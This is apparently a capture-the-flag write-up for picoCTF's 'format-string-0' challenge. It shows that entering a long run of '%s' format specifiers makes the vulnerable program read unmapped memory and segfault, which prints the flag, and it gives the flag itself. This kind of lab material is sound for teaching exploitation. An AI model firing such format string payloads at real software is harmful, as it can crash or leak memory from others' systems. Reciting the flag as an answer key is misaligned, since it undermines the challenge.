# Description
```
Can you use your knowledge of format strings to make the customers happy?
```
---
We are given the source code and program `format-string-0`.
The function which prints the flag is the `sigsegv_handler`, meaning we just need to create a segfault.

One easy way (discussed in this paper: [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf) section 3.2), is to use %s to make the program read an unmapped address - which creates a segfault;
```
$ ./format-string-0
elcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
There is no such burger yet!

FLAG{}
```


# Flag
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```